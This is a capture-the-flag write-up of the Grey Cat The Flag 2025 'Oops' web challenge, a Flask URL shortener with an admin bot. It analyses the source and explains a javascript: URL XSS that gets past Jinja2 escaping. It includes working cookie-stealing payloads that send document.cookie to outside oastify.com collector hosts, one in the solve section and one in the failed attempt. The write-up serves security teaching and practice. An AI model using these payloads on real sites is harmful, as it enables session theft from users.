@@ -1,0 +1,649 @@
+---
+title: "Oops 471 - Grey Cat The Flag 2025"
+category: "web"
+subcategory: "xss"
+type: "writeup"
+tags: ["web", "xss", "flask", "sqli", "jinja2", "render-template", "samesite", "grey-cat-the-flag", "grey-cat-the-flag-2025", "2025", "ctf-writeup"]
+summary: "Simple URL shortener. What could go wrong?"
+source:
+  name: "CTFtime writeup #40306"
+  url: "https://ctftime.org/writeup/40306"
+original_source: "https://yufongg.github.io/posts/Oops/"
+ctf:
+  name: "Grey Cat The Flag 2025"
+  year: 2025
+  challenge: "Oops 471"
+---
+
+## Metadata
+
+- **CTF:** Grey Cat The Flag 2025
+- **Task:** Oops 471
+- **Author team:** nongnongago
+- **CTFtime tags:** xss, flask
+- **CTFtime:** <https://ctftime.org/writeup/40306>
+- **Original writeup:** <https://yufongg.github.io/posts/Oops/>
+
+---
+Oops __
+
+Contents __
+
+Oops
+
+__
+
+##  Challenge Description __
+
+Simple URL shortener. What could go wrong?
+
+##  Source Code Analysis __
+
+### app.py (Server)__
+
+>   * `http://web-oops-app:5000/`
+> 
+
+
+____
+
+`
+
+```
+    1
+    2
+    3
+    4
+    5
+    6
+    7
+    8
+    9
+    10
+    11
+    12
+    13
+    14
+    15
+    16
+    17
+    18
+    19
+    20
+    21
+    22
+    23
+    24
+    25
+    26
+    27
+    28
+    29
+    30
+    31
+    32
+    33
+    34
+    35
+    36
+```
+
+| 
+
+```
+     @app.route('/', methods=['GET', 'POST'])
+    def index():
+        message = None
+        shortened_url = None
+        
+        if request.method == 'POST':
+            original_url = request.form['original_url']
+    
+    
+            url = original_url.lower()
+            while "script" in url:
+                url = url.replace("script", "")
+            
+            # Generate unique short code
+            while True:
+                short_code = generate_short_code()
+                conn = get_db_connection()
+                existing = conn.execute('SELECT id FROM urls WHERE short_code = ?', 
+                                      (short_code,)).fetchone()
+                if not existing:
+                    break
+                conn.close()
+            
+            # Save to database
+            conn = get_db_connection()
+            conn.execute('INSERT INTO urls (original_url, short_code) VALUES (?, ?)',
+                        (original_url, short_code))
+            conn.commit()
+            conn.close()
+            
+            shortened_url = request.host_url + short_code
+            message = "URL shortened successfully!"
+        
+        return render_template("index.html", 
+                                    message=message, 
+                                    shortened_url=shortened_url)
+```  
+  
+---|---  
+`
+
+>   1. Receives the specified URL.
+>   2. Generates a 6 character alphanumeric string (`short_code`).
+>   3. Checks db to see if the `short_code` already exists, if its unique, break out of the loop.
+>   4. Inserts the original URL and the alphanumeric string into the db.
+>   5. Returns `request.host_url + short_code`.
+> 
+
+
+> Not Vulnerable to SQLi
+> 
+>   * Parameterized queries are used.
+>   * User input is **bound** as data, not concatenated.
+> 
+
+
+> Issues with the Code
+> 
+>   1. No validation, the server does not validate whether `original_url` is a properly formatted URL.
+>   2. No sanitization, `original_url` is inserted into the database without sanitization.
+> 
+
+
+* * *
+
+____
+
+`
+
+```
+    1
+    2
+    3
+    4
+    5
+    6
+    7
+    8
+    9
+    10
+```
+
+| 
+
+```
+     @app.post('/report')
+    def report():
+        submit_id = request.form["submit_id"]
+        submit_id = submit_id.split("/")[-1]
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ADMIN_HOST, ADMIN_PORT))
+        s.sendall(submit_id.encode())
+        s.close()
+        return render_template("index.html", 
+                                    report_message="Reported successfully.")
+```  
+  
+---|---  
+`
+
+>   1. Connects to `web-oops-admin:3000`.
+>   2. Splits the specified URL and store the `path` into `submit_id`.
+>   3. Send `submit_id` to the admin server at `web-oops-admin:3000`.
+>   4. The logic of the admin server `web-oops-admin:3000` is the next section (`bot.js`)
+> 
+
+
+* * *
+
+____
+
+`
+
+```
+    1
+    2
+    3
+    4
+    5
+    6
+    7
+    8
+    9
+    10
+    11
+    12
+    13
+    14
+    15
+    16
+```
+
+| 
+
+```
+     @app.route('/<short_code>')
+    def redirect_url(short_code):
+        conn = get_db_connection()
+        url_data = conn.execute('SELECT original_url FROM urls WHERE short_code = ?', 
+                               (short_code,)).fetchone()
+        
+        if url_data:
+            # Increment click counter
+            conn.execute('UPDATE urls SET clicks = clicks + 1 WHERE short_code = ?', 
+                        (short_code,))
+            conn.commit()
+            conn.close()
+            return render_template("redir.html", url=url_data["original_url"]), 200
+        else:
+            conn.close()
+            return render_template("not_found.html"), 404
+```  
+  
+---|---  
+`
+
+>   1. Retrieves the `original_url` from the database based on the user-supplied `short_code`.
+>   2. Renders the `redir.html` template, passing the **unvalidated** and **unsanitized** `original_url` as a template variable `url`.
+>   3. Flask (`Jinja2`) escapes HTML characters by default when rendering in HTML.
+> 
+
+
+____
+
+`
+
+```
+    1
+    2
+    3
+    4
+```
+
+| 
+
+```
+     <!-- redir.html -->
+    <script>
+        location.href = ""
+    </script>
+```  
+  
+---|---  
+`
+
+> `original_url` is inserted inside `<script>` tags
+
+> Vulnerable to XSS, here’s why
+> 
+>   1. `location.href` can be used to execute JS. Refer to [this](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded).
+>   2. The original URL is not sanitized before it is inserted into the DB.
+>   3. The original URL is **partially sanitized (Only HTML characters are escaped)** by `Jinja2` when rendering `redir.html`. Dangerous `JS` characters such as ` not escaped.
+> 
+
+
+### bot.js (Admin)__
+
+>   * `web-oops-admin:3000`
+> 
+
+
+* * *
+
+____
+
+`
+
+```
+    1
+    2
+    3
+    4
+    5
+    6
+    7
+    8
+    9
+    10
+    11
+    12
+    13
+    14
+    15
+    16
+    17
+    18
+    19
+    20
+    21
+    22
+    23
+    24
+```
+
+| 
+
+```
+     const visitSubmission = async (id) => {
+        if (!id.match(/^[0-9a-zA-Z]{6}$/)) {
+            return
+        }
+        const browser = await getBrowser()
+        const page = await browser.newPage()
+        const hostname = new URL(BASE_URL).hostname
+        await page.setCookie({
+            name: 'admin_flag',
+            value: FLAG,
+            domain: hostname,
+            path: '/',
+            httpOnly: false,
+            secure: false
+        })
+        try {
+            await page.goto(BASE_URL + id, { waitUntil: 'networkidle2', timeout: 5000 })
+        }
+        catch (e) {
+            console.log(e)
+        }
+        await page.close()
+        returnBrowser(browser)
+    }
+```  
+  
+---|---  
+`
+
+>   1. Checks if the argument `id` is a 6-character alphanumeric string.
+>   2. Initializes browser and page
+>   3. Obtains hostname based on `http://web-oops-app:5000/` -> `web-oops-app`
+>   4. Sets a cookie with attributes **critical** to whether it will be sent on page visits.
+>   5. Visits the page and sends cookie depending whether the website qualifies for the cookie to be sent.
+> 
+
+
+> Cookie Attribute Breakdown, [Learn Here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
+> 
+>   * `domain: hostname` -> `domain: web-oops-app`
+>     * Cookie will only be sent IF visiting website domain is `web-oops-app`, we can’t simply specify an arbitrary website for the bot to visit for e.g. `x.oastify.com` , otherwise the cookie will NOT be sent.
+>   * `path: /`
+>     * Cookie is sent for all paths (`/` and anything under it).
+>   * `httpOnly: false`
+>     * Cookie can be accessed with JS, so we can do `document.cookie`.
+>   * `secure: false`
+>     * Cookie is sent even if visiting website is `http`
+>     * This is only allowed if `SameSite=Lax/Strict`.
+>   * `SameSite: unset`
+>     * Defaults to `Lax`.
+> 
+
+
+* * *
+
+____
+
+`
+
+```
+    1
+    2
+    3
+    4
+    5
+    6
+```
+
+| 
+
+```
+     const server = net.createServer((socket) => {
+        socket.on('data', async (data) => {
+            const id = data.toString()
+            await visitSubmission(id)
+        })
+    })
+```  
+  
+---|---  
+`
+
+>   * Starts a server to receive `submit_id` from `/report` and trigger `visitSubmission(id)`.
+> 
+
+
+## TLDR __
+
+**Admin Server (`bot.js`) Behavior:**
+
+  * `bot.js` script acts as an admin user, automatically visiting URLs reported through `/report`.
+  * Based on the implementation, the admin bot will only visit
+    * URLs hosted on `http://web-oops-app:5000` AND
+    * Paths that match a 6-character alphanumeric string (`[0-9a-zA-Z]{6}`).
+
+
+**URL Shortening and Redirection Logic:**
+
+  1. User submits a `POST` request to `http://web-oops-app:5000/`.
+
+>      1. The server generates a random 6-character alphanumeric `short_code`, maps it to the submitted `original_url`.
+>      2. Inserts the mapping into the database.
+>      3. Returns the shortened URL, `http://challs2.nusgreyhats.org:33001/ZT1ETj`.
+
+  2. User visits the shortened URL
+
+>      1. The server retrieves the `original_url` associated with the `short_code` from the database.
+>      2. The server renders `redir.html`, injecting the `original_url` into (view snippet below)
+
+____
+
+`
+[code]1
+    2
+    3
+```
+
+| 
+[code]<script>
+         location.href = ""
+     </script>
+```  
+  
+---|---  
+`
+
+
+**To solve:**
+
+  1. Submit an XSS payload `javascript:alert(document.cookie)` instead of a normal URL. The server generates a random 6-character alphanumeric `short_code`, maps it to the submitted `original_url` (xss payload), inserts the mapping into the database, and returns the shortened URL
+     * The payload MUST NOT contain any HTML special characters (`"`, `<`, `>`, `&`, `'`).
+  2. Report the shortened URL via the `/report` endpoint.
+  3. Admin visits the shortened URL because it complies with the restrictions `http://web-opps-app:5000` and the path matches the expected 6-character alphanumeric format.
+  4. Server retrieves the `original_url` associated with the `short_code` from the database and renders it into `redir.html`. Flask returns `<script>location.href="<original_url>"</script>`. In this case it will be `<script>location.href="javacsript:alert(document.cookie)"</script>`
+  5. The XSS payload is executed when the admin loads the page.
+
+
+## Solve __
+
+  1. Verify that XSS is possible with an alert payload
+
+____
+
+`
+[code]1
+```
+
+| 
+[code]original_url=javascript:alert(1)
+```  
+  
+---|---  
+`
+
+[![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748770951108.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748770951108.png)
+
+  2. Visit the shortened URL [![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748771091150.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748771091150.png)
+
+  3. Replace the `alert` with a payload to exfiltrate cookies and verify it locally before proceeding.
+
+____
+
+`
+[code]1
+```
+
+| 
+[code]javascript:location.href=`https://k4psg6qqz7gqf2jspepvrpmgt7zynqlea.oastify.com/collect?c=${document.cookie}`
+```  
+  
+---|---  
+`
+
+[![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748771249888.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748771249888.png)
+
+> Payload Worked !
+> 
+>      * It doesn’t use any HTML characters.
+>      * `httpOnly: false`, the cookie is **accessible via`document.cookie`** and can be exfiltrated.
+>      * We’re redirected to attacker’s server.
+
+  4. Report the shortened URL.
+
+  5. Admin visits the URL, XSS executes and redirects to the attacker’s site, appending the admin’s cookie as a GET parameter [![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748770874645.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1748770874645.png)
+
+  6. Solve
+
+  7. Solver
+
+> [code](https://github.com/yufongg/ctf/blob/main/greyctf/2025/web/oops/solve.py)
+
+____
+
+`
+[code]1
+         2
+         3
+         4
+```
+
+| 
+[code]~/labs/greyctf2025/ezpz/oops
+          venv3 ❯ python3 solve.py --url http://192.168.150.135:33001 --webhook_url https://1y09ank7toa79jd9jvjcl6gxnotfh7iv7.oastify.com
+          [+] shortened_url: http://192.168.150.135:33001/d6jJkf
+          [+] check collaborator for flag
+```  
+  
+---|---  
+`
+
+
+## Failed Attempt __
+
+For my first attempt, I went with this
+
+  1. Hosted a public site `https://2ff5-121-7-203-27.ngrok-free.app` with an XSS payload meant to exfiltrate cookies.
+  2. Shorten the URL so that `bot.js` (the admin user) would visit it.
+  3. When the admin accesses the shortened link `http://192.168.150.135:33001/5MHOUn`, they are redirected to `https://2ff5-121-7-203-27.ngrok-free.app`.
+  4. However, the browser didn’t include the flag cookie due to the origin mismatch.
+  5. The XSS payload on the attacker’s website executes in the admin’s browser, but there is no cookie to exfiltrate.
+
+
+* * *
+
+  1. Create XSS payload, `index.html`
+
+____
+
+`
+[code]1
+```
+
+| 
+[code]<script>var i=new Image(); i.src="http://c9m5u7a6n98fpqpfxor5m8qyopugi76w.oastify.com/?cookie="+btoa(document.cookie);</script>
+```  
+  
+---|---  
+`
+
+  2. Host XSS payload
+
+     1. Start `ngrok`
+
+>         * [ngrok setup](https://ngrok.com/docs/getting-started/)
+
+____
+
+`
+[code]1
+    2
+    3
+    4
+    5
+    6
+    7
+    8
+    9
+    10
+    11
+    12
+    13
+    14
+```
+
+| 
+[code]Version                       3.7.0
+     Region                        Asia Pacific (ap)
+     Latency                       5ms
+     Web Interface                 http://127.0.0.1:4040
+     Forwarding                    https://2ff5-121-7-203-27.ngrok-free.app -> http://localhost:80
+    		
+     Connections                   ttl     opn     rt1     rt5     p50     p90
+                                   3       0       0.01    0.01    0.00    0.01
+    			
+     HTTP Requests
+     -------------
+    		
+     GET /                          304 Not Modified
+     GET /favicon.ico               404 File not found
+```  
+  
+---|---  
+`
+
+>         * `https://2ff5-121-7-203-27.ngrok-free.app` forwards external traffic to your local Python web server via Ngrok, effectively exposing it to the internet.
+
+     2. Start python webserver hosting XSS payload
+
+____
+
+`
+[code]1
+            2
+```
+
+| 
+[code]root in ezpz/oops/www took 3m 43.6s …
+             ➜ python3 -m http.server 80
+```  
+  
+---|---  
+`
+
+  3. Shorten `ngrok` URL [![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1749716645154.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1749716645154.png)
+
+  4. Report shortened URL [![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1749716669589.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1749716669589.png)
+
+  5. Cookie is not exfiltrated [![](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1749718440895.png)](https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/CTF/GreyCTF%202025/Web/Oops/attachments/Oops-1749718440895.png)
+
+  6. Failed Attempt
+
+
+__[GreyCTF 2025](https://yufongg.github.io/categories/greyctf-2025/), [Web](https://yufongg.github.io/categories/web/)
+
+__[greyctf-2025](https://yufongg.github.io/tags/greyctf-2025/) [writeup-winner](https://yufongg.github.io/tags/writeup-winner/)
+
+This post is licensed under [ CC BY 4.0 ](https://creativecommons.org/licenses/by/4.0/) by the author.
+
+Share [ __](https://twitter.com/intent/tweet?text=Oops%20-%200xyf&url=https%3A%2F%2Fyufongg.github.io%2Fposts%2FOops%2F "Twitter") [ __](https://t.me/share/url?url=https%3A%2F%2Fyufongg.github.io%2Fposts%2FOops%2F&text=Oops%20-%200xyf "Telegram") [ __](https://www.linkedin.com/feed/?shareActive=true&shareUrl=https%3A%2F%2Fyufongg.github.io%2Fposts%2FOops%2F "Linkedin") [ __](https://www.reddit.com/submit?url=https%3A%2F%2Fyufongg.github.io%2Fposts%2FOops%2F&title=Oops%20-%200xyf "Reddit") __
